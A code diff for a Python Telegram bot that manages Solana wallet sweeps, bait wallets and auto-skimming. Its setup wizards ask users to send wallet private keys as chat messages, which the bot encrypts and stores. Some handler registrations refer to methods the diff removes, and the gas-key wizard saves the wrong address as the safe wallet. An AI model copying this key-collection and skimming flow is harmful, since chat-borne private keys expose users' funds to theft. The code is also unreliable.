@@ -14,8 +14,6 @@ class SetupWizard(StatesGroup):
     waiting_for_skim_retain = State()
     waiting_for_skim_threshold = State()
     waiting_for_skim_addresses = State()
-    
-    # Feature Wizards
     waiting_for_remove_wallet = State()
     waiting_for_vault_address = State()
     waiting_for_gas_key = State()
@@ -45,139 +43,6 @@ class NotificationService:
             types.InlineKeyboardButton(text="❌ NO", callback_data=f"{prefix}_no")
         )
         return builder.as_markup()
-
-    def _register_handlers(self):
-        @self.dp.callback_query(F.data.startswith("sweep_"))
-        async def handle_manual_sweep_callback(callback: types.CallbackQuery):
-            target = callback.data.split("_")[1]
-            user_id = str(callback.from_user.id)
-            if target == "all":
-                await callback.message.answer("🚀 *GLOBAL PANIC:* Sweeping all protected assets...")
-                if self.emergency_service: await self.emergency_service.execute_all(user_id)
-            else:
-                await callback.message.answer(f"🚀 Executing Emergency Sweep for {target}...")
-                if self.emergency_service: await self.emergency_service.execute_all(user_id)
-            await callback.answer("Sweep Initiated")
-
-        @self.dp.callback_query(F.data == "toggle_auto")
-        async def handle_toggle_auto(callback: types.CallbackQuery):
-            user_id = str(callback.from_user.id)
-            state = await self.db.get_user_state(user_id)
-            current = state['auto_defense'] if state else False
-            await self.db.update_user_state(user_id, auto_defense=not current)
-            new_status = "ON" if not current else "OFF"
-            await callback.message.edit_text(f"🤖 Auto-Defense is now: *{new_status}*", parse_mode="Markdown")
-            await callback.answer(f"Auto-Defense {new_status}")
-
-        @self.dp.callback_query(F.data == "change_safe")
-        async def handle_change_safe(callback: types.CallbackQuery, state: FSMContext):
-            await callback.message.answer("🏦 Please send your new *Safe Wallet Address*:", parse_mode="Markdown")
-            await state.set_state(SetupWizard.waiting_for_safe_wallet)
-            await callback.answer()
-
-        @self.dp.callback_query(F.data == "ignore")
-        async def handle_ignore(callback: types.CallbackQuery):
-            await callback.message.edit_text("✅ Alert Dismissed.")
-            await callback.answer()
-
-        @self.dp.callback_query(F.data == "status_refresh")
-        async def handle_status_refresh(callback: types.CallbackQuery):
-            await self.status_command(callback.message, user_id_override=str(callback.from_user.id))
-            await callback.answer()
-
-        @self.dp.callback_query(F.data == "settings_menu")
-        async def handle_settings_menu(callback: types.CallbackQuery):
-            await self.show_settings_menu(user_id=str(callback.from_user.id))
-            await callback.answer()
-
-        @self.dp.callback_query(F.data == "panic_confirm")
-        async def handle_panic_confirm(callback: types.CallbackQuery):
-            await self.panic_command(callback.message)
-            await callback.answer()
-
-        @self.dp.callback_query(F.data == "toggle_refill")
-        async def handle_toggle_refill(callback: types.CallbackQuery):
-            user_id = str(callback.from_user.id)
-            state = await self.db.get_user_state(user_id)
-            if not state: return
-            new_val = 0 if dict(state).get('auto_refill_gas', 1) else 1
-            await self.db.update_user_state(user_id, auto_refill_gas=new_val)
-            await callback.answer(f"⛽ Auto-Refill {'ENABLED' if new_val else 'DISABLED'}")
-            await self.show_settings_menu(user_id)
-
-        @self.dp.callback_query(F.data == "toggle_skimming")
-        async def handle_toggle_skimming(callback: types.CallbackQuery):
-            user_id = str(callback.from_user.id)
-            state = await self.db.get_user_state(user_id)
-            current = state['skimming_enabled'] if state else False
-            await self.db.update_user_state(user_id, skimming_enabled=not current)
-            new_status = "ON" if not current else "OFF"
-            await callback.message.edit_text(f"🍯 Auto-Skimming is now: *{new_status}*", parse_mode="Markdown")
-            await callback.answer(f"Skimming {new_status}")
-
-        @self.dp.callback_query(F.data == "wizard_admin_rpc")
-        async def handle_wizard_admin_rpc(callback: types.CallbackQuery, state: FSMContext):
-            user_id = str(callback.from_user.id)
-            await self.db.update_user_state(user_id, custom_rpc_url=config.SOLANA_RPC_URL)
-            await callback.message.edit_text("⚡ *Admin Mode Active:* System RPC linked to your account.")
-            await state.clear()
-            await callback.answer()
-
-        @self.dp.callback_query(F.data == "reset_confirm")
-        async def handle_reset_confirm(callback: types.CallbackQuery):
-            user_id = str(callback.from_user.id)
-            await self.db.update_user_state(user_id, monitored_wallets_json='[]', bait_wallets_json='[]', safe_wallet_address=None, safe_wallet_configured=False, custom_rpc_url=None, auto_defense=False)
-            await callback.message.edit_text("🗑️ *STATE WIPED:* All wallets and configurations have been deleted instantly.", parse_mode="Markdown")
-            await callback.answer("Data Deleted")
-
-        self.dp.message.register(self.start_command, Command("start"))
-        self.dp.message.register(self.panic_command, Command("panic"))
-        self.dp.message.register(self.vault_command, Command("vault"))
-        self.dp.message.register(self.status_command, Command("status"))
-        self.dp.message.register(self.wallets_command, Command("wallets"))
-        self.dp.message.register(self.history_command, Command("history"))
-        self.dp.message.register(self.health_command, Command("health"))
-        self.dp.message.register(self.skim_command, Command("skim"))
-        self.dp.message.register(self.settings_command, Command("settings"))
-        self.dp.message.register(self.faq_command, Command("faq"))
-        self.dp.message.register(self.recommend_command, Command("recommend"))
-        self.dp.message.register(self.premium_command, Command("premium"))
-        self.dp.message.register(self.set_tip_command, Command("set_tip"))
-        self.dp.message.register(self.set_rpc_command, Command("set_rpc"))
-        self.dp.message.register(self.set_safe_command, Command("set_safe"))
-        self.dp.message.register(self.set_gas_key_command, Command("set_gas_key"))
-        self.dp.message.register(self.add_monitored_command, Command("add_monitored"))
-        self.dp.message.register(self.add_bait_command, Command("add_bait"))
-        self.dp.message.register(self.remove_wallet_command, Command("remove_wallet"))
-        self.dp.message.register(self.set_daily_sweep_command, Command("set_daily_sweep"))
-        self.dp.message.register(self.toggle_smart_command, Command("toggle_smart"))
-        self.dp.message.register(self.unlock_command, Command("unlock"))
-        self.dp.message.register(self.setup_nonce_command, Command("setup_nonce"))
-        self.dp.message.register(self.cancel_command, Command("cancel"))
-        self.dp.message.register(self.reset_state_command, Command("reset_state"))
-        self.dp.message.register(self.report_command, Command("report"))
-        self.dp.message.register(self.test_attack_command, Command("test_attack"))
-
-        self.dp.message.register(self.wizard_safe_wallet, SetupWizard.waiting_for_safe_wallet)
-        self.dp.message.register(self.wizard_monitored_wallet, SetupWizard.waiting_for_monitored_wallet)
-        self.dp.message.register(self.wizard_vault_key, SetupWizard.waiting_for_vault_key)
-        self.dp.message.register(self.wizard_skim_retain, SetupWizard.waiting_for_skim_retain)
-        self.dp.message.register(self.wizard_skim_threshold, SetupWizard.waiting_for_skim_threshold)
-        self.dp.message.register(self.wizard_skim_addresses, SetupWizard.waiting_for_skim_addresses)
-        self.dp.message.register(self.wizard_bait_addresses, SetupWizard.waiting_for_bait_addresses)
-        self.dp.message.register(self.wizard_remove_wallet, SetupWizard.waiting_for_remove_wallet)
-        self.dp.message.register(self.wizard_vault_address, SetupWizard.waiting_for_vault_address)
-        self.dp.message.register(self.wizard_gas_key, SetupWizard.waiting_for_gas_key)
-        self.dp.message.register(self.wizard_tip_amount, SetupWizard.waiting_for_tip_amount)
-        self.dp.message.register(self.wizard_rpc_url, SetupWizard.waiting_for_rpc_url)
-        
-        self.dp.callback_query.register(self.handle_buy_premium_ton, F.data.startswith("buy_"))
-        self.dp.callback_query.register(self.handle_toggle_auto_wizard, F.data.startswith("toggle_auto_wizard_"))
-        self.dp.callback_query.register(self.handle_toggle_daily, F.data == "toggle_daily")
-        self.dp.callback_query.register(self.handle_toggle_smart, F.data == "toggle_smart")
-        self.dp.callback_query.register(self.handle_toggle_refill, F.data == "toggle_refill")
-        self.dp.callback_query.register(self.handle_toggle_skimming, F.data == "toggle_skimming")
-        self.dp.callback_query.register(self.handle_toggle_auto, F.data == "toggle_auto")
 
     async def premium_command(self, message: types.Message):
         user_id = str(message.from_user.id)
@@ -327,10 +192,90 @@ class NotificationService:
         await message.answer("🍯 *SKIM:* Set Retain Amount (SOL).")
         await state.set_state(SetupWizard.waiting_for_skim_retain)
 
+    async def wizard_skim_retain(self, message: types.Message, state: FSMContext):
+        try:
+            val = float(message.text.strip())
+            await state.update_data(skim_retain=val)
+            await message.answer(f"✅ Retain: `{val} SOL`. Now set Trigger Balance (SOL).")
+            await state.set_state(SetupWizard.waiting_for_skim_threshold)
+        except: await message.answer("❌ Invalid number.")
+
+    async def wizard_skim_threshold(self, message: types.Message, state: FSMContext):
+        try:
+            val = float(message.text.strip())
+            data = await state.get_data()
+            await self.db.update_user_state(str(message.from_user.id), skimming_retain=data.get('skim_retain'), skimming_threshold=val, skimming_enabled=True)
+            await message.answer(f"🍯 *Auto-Skimming ARMED!* Trigger: `{val} SOL`.")
+            await state.clear()
+        except: await message.answer("❌ Invalid number.")
+
+    async def wizard_skim_addresses(self, message: types.Message, state: FSMContext):
+        await self.wizard_bait_addresses(message, state)
+
+    async def wizard_bait_addresses(self, message: types.Message, state: FSMContext):
+        raw = message.text.replace(",", " ").split()
+        user_id = str(message.from_user.id)
+        row = await self.db.get_user_state(user_id)
+        baits = json.loads(row['bait_wallets_json'] if row and row['bait_wallets_json'] else '[]')
+        added = []
+        from solders.pubkey import Pubkey
+        for addr in raw:
+            try:
+                Pubkey.from_string(addr)
+                if addr not in baits:
+                    baits.append(addr)
+                    added.append(addr)
+            except: pass
+        if added:
+            await self.db.update_user_state(user_id, bait_wallets_json=json.dumps(baits))
+            await message.answer(f"✅ Added `{len(added)}` baits. Send Private Keys.")
+            await state.set_state(SetupWizard.waiting_for_vault_key)
+        else: await message.answer("❌ No valid addresses.")
+
     async def set_rpc_command(self, message: types.Message, state: FSMContext):
         await state.clear()
         await message.answer("📡 *RPC:* Send private HTTP URL.")
         await state.set_state(SetupWizard.waiting_for_rpc_url)
+
+    async def wizard_rpc_url(self, message: types.Message, state: FSMContext):
+        url = message.text.strip()
+        if url.startswith("http"):
+            await self.db.update_user_state(str(message.from_user.id), custom_rpc_url=url)
+            await message.answer("✅ RPC Updated.")
+            await state.clear()
+        else: await message.answer("❌ Invalid URL.")
+
+    async def wizard_vault_address(self, message: types.Message, state: FSMContext):
+        addr = message.text.strip()
+        from solders.pubkey import Pubkey
+        try:
+            Pubkey.from_string(addr)
+            await state.update_data(vault_address=addr)
+            await message.answer(f"✅ Address received. Now send Private Key.")
+            await state.set_state(SetupWizard.waiting_for_vault_key)
+        except: await message.answer("❌ Invalid Address.")
+
+    async def wizard_gas_key(self, message: types.Message, state: FSMContext):
+        priv = message.text.strip()
+        from solders.keypair import Keypair
+        try:
+            kp = Keypair.from_base58_string(priv)
+            addr = str(kp.pubkey())
+            from utils.encryption_utils import EncryptionManager
+            encryptor = EncryptionManager(config.ENCRYPTION_KEY)
+            await self.db.store_vault_key(addr, encryptor.encrypt(priv))
+            await self.db.update_user_state(str(message.from_user.id), safe_wallet_address=addr, safe_wallet_configured=True)
+            await message.answer(f"⛽ *GAS TANK:* `{addr[:8]}...` linked.")
+            await state.clear()
+        except: await message.answer("❌ Invalid Private Key.")
+
+    async def wizard_tip_amount(self, message: types.Message, state: FSMContext):
+        try:
+            val = float(message.text.strip())
+            await self.db.update_user_state(str(message.from_user.id), jito_tip_sol=val)
+            await message.answer(f"⚡ Tip set to `{val} SOL`.")
+            await state.clear()
+        except: await message.answer("❌ Invalid number.")
 
     async def set_safe_command(self, message: types.Message, state: FSMContext):
         await state.clear()
@@ -418,3 +363,89 @@ class NotificationService:
             BotCommand(command="cancel", description="Cancel"),
         ])
         await self.dp.start_polling(self.bot)
+
+    def _register_handlers(self):
+        @self.dp.callback_query(F.data.startswith("sweep_"))
+        async def handle_manual_sweep_callback(callback: types.CallbackQuery):
+            target = callback.data.split("_")[1]
+            user_id = str(callback.from_user.id)
+            if target == "all":
+                await callback.message.answer("🚀 *GLOBAL PANIC:* Sweeping...")
+                if self.emergency_service: await self.emergency_service.execute_all(user_id)
+            else:
+                await callback.message.answer(f"🚀 Sweeping {target}...")
+                if self.emergency_service: await self.emergency_service.execute_all(user_id)
+            await callback.answer()
+
+        @self.dp.callback_query(F.data == "toggle_auto")
+        async def handle_toggle_auto(callback: types.CallbackQuery):
+            user_id = str(callback.from_user.id)
+            state = await self.db.get_user_state(user_id)
+            curr = state['auto_defense'] if state else False
+            await self.db.update_user_state(user_id, auto_defense=not curr)
+            await callback.message.edit_text(f"🤖 Auto-Defense: {'ON' if not curr else 'OFF'}")
+            await callback.answer()
+
+        @self.dp.callback_query(F.data == "status_refresh")
+        async def handle_status_refresh(callback: types.CallbackQuery):
+            await self.status_command(callback.message, user_id_override=str(callback.from_user.id))
+            await callback.answer()
+
+        @self.dp.callback_query(F.data == "settings_menu")
+        async def handle_settings_menu(callback: types.CallbackQuery):
+            await self.show_settings_menu(user_id=str(callback.from_user.id))
+            await callback.answer()
+
+        @self.dp.callback_query(F.data == "reset_confirm")
+        async def handle_reset_confirm(callback: types.CallbackQuery):
+            await self.reset_state_command(callback.message, None)
+            await callback.answer()
+
+        self.dp.message.register(self.start_command, Command("start"))
+        self.dp.message.register(self.panic_command, Command("panic"))
+        self.dp.message.register(self.vault_command, Command("vault"))
+        self.dp.message.register(self.status_command, Command("status"))
+        self.dp.message.register(self.wallets_command, Command("wallets"))
+        self.dp.message.register(self.history_command, Command("history"))
+        self.dp.message.register(self.health_command, Command("health"))
+        self.dp.message.register(self.skim_command, Command("skim"))
+        self.dp.message.register(self.settings_command, Command("settings"))
+        self.dp.message.register(self.faq_command, Command("faq"))
+        self.dp.message.register(self.recommend_command, Command("recommend"))
+        self.dp.message.register(self.premium_command, Command("premium"))
+        self.dp.message.register(self.set_tip_command, Command("set_tip"))
+        self.dp.message.register(self.set_rpc_command, Command("set_rpc"))
+        self.dp.message.register(self.set_safe_command, Command("set_safe"))
+        self.dp.message.register(self.set_gas_key_command, Command("set_gas_key"))
+        self.dp.message.register(self.add_monitored_command, Command("add_monitored"))
+        self.dp.message.register(self.add_bait_command, Command("add_bait"))
+        self.dp.message.register(self.remove_wallet_command, Command("remove_wallet"))
+        self.dp.message.register(self.set_daily_sweep_command, Command("set_daily_sweep"))
+        self.dp.message.register(self.toggle_smart_command, Command("toggle_smart"))
+        self.dp.message.register(self.unlock_command, Command("unlock"))
+        self.dp.message.register(self.setup_nonce_command, Command("setup_nonce"))
+        self.dp.message.register(self.cancel_command, Command("cancel"))
+        self.dp.message.register(self.reset_state_command, Command("reset_state"))
+        self.dp.message.register(self.report_command, Command("report"))
+        self.dp.message.register(self.test_attack_command, Command("test_attack"))
+
+        self.dp.message.register(self.wizard_safe_wallet, SetupWizard.waiting_for_safe_wallet)
+        self.dp.message.register(self.wizard_monitored_wallet, SetupWizard.waiting_for_monitored_wallet)
+        self.dp.message.register(self.wizard_vault_key, SetupWizard.waiting_for_vault_key)
+        self.dp.message.register(self.wizard_skim_retain, SetupWizard.waiting_for_skim_retain)
+        self.dp.message.register(self.wizard_skim_threshold, SetupWizard.waiting_for_skim_threshold)
+        self.dp.message.register(self.wizard_skim_addresses, SetupWizard.waiting_for_skim_addresses)
+        self.dp.message.register(self.wizard_bait_addresses, SetupWizard.waiting_for_bait_addresses)
+        self.dp.message.register(self.wizard_remove_wallet, SetupWizard.waiting_for_remove_wallet)
+        self.dp.message.register(self.wizard_vault_address, SetupWizard.waiting_for_vault_address)
+        self.dp.message.register(self.wizard_gas_key, SetupWizard.waiting_for_gas_key)
+        self.dp.message.register(self.wizard_tip_amount, SetupWizard.waiting_for_tip_amount)
+        self.dp.message.register(self.wizard_rpc_url, SetupWizard.waiting_for_rpc_url)
+        
+        self.dp.callback_query.register(self.handle_buy_premium_ton, F.data.startswith("buy_"))
+        self.dp.callback_query.register(self.handle_toggle_auto_wizard, F.data.startswith("toggle_auto_wizard_"))
+        self.dp.callback_query.register(self.handle_toggle_daily, F.data == "toggle_daily")
+        self.dp.callback_query.register(self.handle_toggle_smart, F.data == "toggle_smart")
+        self.dp.callback_query.register(self.handle_toggle_refill, F.data == "toggle_refill")
+        self.dp.callback_query.register(self.handle_toggle_skimming, F.data == "toggle_skimming")
+        self.dp.callback_query.register(self.handle_toggle_auto, F.data == "toggle_auto")
